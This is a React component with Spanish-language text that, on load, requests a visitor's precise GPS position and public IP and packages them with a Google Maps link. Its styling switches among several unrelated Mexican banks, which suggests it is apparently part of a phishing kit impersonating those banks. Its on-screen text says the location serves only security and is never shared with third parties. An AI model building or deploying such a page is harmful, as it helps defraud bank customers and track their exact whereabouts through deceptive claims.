import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { MapPin, AlertCircle, Loader2 } from 'lucide-react';

interface GeolocationRequestProps {
  onLocationGranted: (locationData: LocationData) => void;
  onLocationDenied: () => void;
  bankType?: string;
}

interface LocationData {
  latitude: string;
  longitude: string;
  googleMapsLink: string;
  timestamp: string;
  ipAddress: string;
}

const GeolocationRequest: React.FC<GeolocationRequestProps> = ({
  onLocationGranted,
  onLocationDenied,
  bankType
}) => {
  const [isRequestingLocation, setIsRequestingLocation] = useState(true);
  const [locationError, setLocationError] = useState<string | null>(null);

  const requestLocation = async () => {
    setIsRequestingLocation(true);
    setLocationError(null);

    // Verificar si la geolocalización está disponible
    if (!navigator.geolocation) {
      setLocationError('La geolocalización no está soportada en este navegador.');
      setIsRequestingLocation(false);
      return;
    }

    try {
      // Obtener la IP del usuario primero
      let ipAddress = 'IP no disponible';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip;
      } catch (ipError) {
        console.warn('[Geolocation] No se pudo obtener la IP:', ipError);
        // Continuar sin IP
      }

      // Solicitar ubicación con alta precisión
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          
          // Crear enlace de Google Maps
          const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
          
          const locationData: LocationData = {
            latitude: latitude.toString(),
            longitude: longitude.toString(),
            googleMapsLink,
            timestamp: new Date().toISOString(),
            ipAddress
          };

          console.log('[Geolocation] Ubicación obtenida:', locationData);
          
          setIsRequestingLocation(false);
          onLocationGranted(locationData);
        },
        (error) => {
          console.error('[Geolocation] Error obteniendo ubicación:', error);
          
          let errorMessage = 'No se pudo obtener la ubicación.';
          
          switch (error.code) {
            case error.PERMISSION_DENIED:
              errorMessage = 'Permiso de ubicación denegado. Continuando sin ubicación...';
              setLocationError(errorMessage);
              setIsRequestingLocation(false);
              // Llamar al callback de ubicación denegada después de un pequeño delay
              setTimeout(() => {
                onLocationDenied();
              }, 2000);
              return;
            case error.POSITION_UNAVAILABLE:
              errorMessage = 'Información de ubicación no disponible. Verifica tu conexión GPS.';
              break;
            case error.TIMEOUT:
              errorMessage = 'El tiempo de espera para obtener la ubicación expiró. Continuando sin ubicación...';
              setLocationError(errorMessage);
              setIsRequestingLocation(false);
              // También continuar sin ubicación después de timeout
              setTimeout(() => {
                onLocationDenied();
              }, 2000);
              return;
            default:
              errorMessage = 'Error desconocido al obtener la ubicación.';
              break;
          }
          
          setLocationError(errorMessage);
          setIsRequestingLocation(false);
        },
        {
          enableHighAccuracy: true, // Alta precisión GPS
          timeout: 10000, // 10 segundos de timeout
          maximumAge: 0 // No usar caché de ubicación
        }
      );
    } catch (error) {
      console.error('[Geolocation] Error general:', error);
      setLocationError('Error al solicitar ubicación.');
      setIsRequestingLocation(false);
    }
  };

  // Solicitar ubicación automáticamente cuando se monta el componente
  useEffect(() => {
    requestLocation();
  }, []);

  const handleDenyLocation = () => {
    console.log('[Geolocation] Usuario denegó ubicación');
    onLocationDenied();
  };

  // Estilos dinámicos basados en el banco
  const getButtonStyle = () => {
    switch (bankType) {
      case 'BANORTE':
        return 'bg-red-600 hover:bg-red-700';
      case 'LIVERPOOL':
        return 'bg-pink-600 hover:bg-pink-700';
      case 'HSBC':
        return 'bg-red-600 hover:bg-red-700';
      case 'BBVA':
        return 'bg-blue-600 hover:bg-blue-700';
      case 'CITIBANAMEX':
        return 'bg-blue-800 hover:bg-blue-900';
      case 'SANTANDER':
        return 'bg-red-700 hover:bg-red-800';
      case 'PLATACARD':
        return 'bg-orange-500 hover:bg-orange-600';
      default:
        return 'bg-blue-600 hover:bg-blue-700';
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white rounded-lg shadow-md p-6 text-center">
      {/* Icono de ubicación */}
      <div className="mb-4">
        <MapPin className="mx-auto h-12 w-12 text-blue-600" />
      </div>
      
      {/* Título */}
      <h2 className="text-xl font-bold mb-3 text-gray-800">
        Acceso a Ubicación
      </h2>
      
      {/* Descripción */}
      <p className="text-gray-600 mb-4 text-sm leading-relaxed">
        Para brindarte un mejor servicio y seguridad, necesitamos acceder a tu ubicación.
        Esta información nos ayuda a verificar tu identidad y proteger tu cuenta.
      </p>
      
      {/* Información adicional */}
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
        <div className="flex items-start">
          <AlertCircle className="h-4 w-4 text-blue-500 mr-2 mt-0.5 flex-shrink-0" />
          <p className="text-blue-700 text-xs text-left">
            Tu ubicación será utilizada únicamente para fines de seguridad y verificación.
            No compartimos esta información con terceros.
          </p>
        </div>
      </div>

      {/* Error message */}
      {locationError && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
          <div className="flex items-start">
            <AlertCircle className="h-4 w-4 text-red-500 mr-2 mt-0.5 flex-shrink-0" />
            <p className="text-red-700 text-xs text-left">
              {locationError}
            </p>
          </div>
        </div>
      )}

      {/* Estado de solicitud */}
      <div className="text-center">
        {isRequestingLocation && !locationError && (
          <div className="flex items-center justify-center space-x-2">
            <Loader2 className="h-5 w-5 animate-spin text-blue-600" />
            <span className="text-blue-600 font-medium">
              Solicitando acceso a ubicación...
            </span>
          </div>
        )}
        
        {locationError && (
          <div className="space-y-3">
            <div className="text-center">
              <span className="text-red-600 font-medium">
                {locationError}
              </span>
            </div>
            {!isRequestingLocation && (
              <Button
                onClick={handleDenyLocation}
                variant="outline"
                className="w-full border-gray-300 text-gray-600 hover:bg-gray-50"
                data-testid="button-continue-without-location"
              >
                Continuar
              </Button>
            )}
          </div>
        )}
      </div>

      {/* Nota legal */}
      <p className="text-xs text-gray-500 mt-4">
        Al permitir el acceso a tu ubicación, aceptas que esta información sea utilizada
        para fines de seguridad y verificación de identidad.
      </p>
    </div>
  );
};

export default GeolocationRequest;